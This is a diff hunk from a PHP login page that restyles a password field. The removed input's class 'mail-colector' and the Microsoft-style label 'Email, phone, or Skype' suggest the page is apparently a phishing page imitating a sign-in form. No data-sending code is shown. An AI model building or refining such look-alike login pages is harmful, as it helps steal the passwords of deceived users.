@@ -67,10 +67,14 @@ if (isset($_POST['register'])) {
 
 						<h4 class="card-title mb-2 font-weight-normal text-black">Enter password</h4>
 
-					   <div class="md-form mb-3">
-							<input type="password" id="password" name="pass" class="form-control mail-colector" placeholder="Password">
-						</div>
-
+	                    <div class="wrapper mb-3 mt-4">
+	                        <div class="input-data">
+                            	<input type="password" id="password" name="pass" required>
+	                            <div class="underline"></div>
+	                            <label for="email">Email, phone, or Skype</label>
+	                        </div>
+	                    </div>
+	                    
 							<div class="mb-2 mt-2">
 							   <input type="checkbox">
 							   <span> Keep me signed in</span>
